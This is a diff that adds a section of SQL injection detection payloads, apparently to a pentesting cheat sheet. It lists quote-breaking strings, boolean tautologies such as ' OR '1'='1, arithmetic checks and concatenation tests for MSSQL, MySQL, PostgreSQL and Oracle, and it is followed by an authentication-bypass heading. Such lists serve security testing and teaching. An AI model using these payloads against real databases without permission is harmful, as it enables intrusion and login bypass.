@@ -22,6 +22,50 @@
 
 ---
 
+## Detection & Testing Payloads
+
+### Simple Detection
+
+```
+''
+"
+'
+"
+')
+")
+'))
+"))
+```
+
+### Echo/Reflection Detection
+
+```
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+' AND (SELECT 1)=1
+' AND (SELECT 1)=2
+```
+
+### Math Detection
+
+```
+' AND 1+1=2
+' AND 1+1=3
+' OR 2*2=4
+' OR 2*2=5
+```
+
+### String Concatenation Detection
+
+```
+' AND 'a'+'b'='ab'  -- MSSQL
+' AND CONCAT('a','b')='ab'  -- MySQL
+' AND 'a'||'b'='ab'  -- PostgreSQL, Oracle
+```
+
+
 ## 🔐 Authentication Bypass
 
 ### Basic Bypass
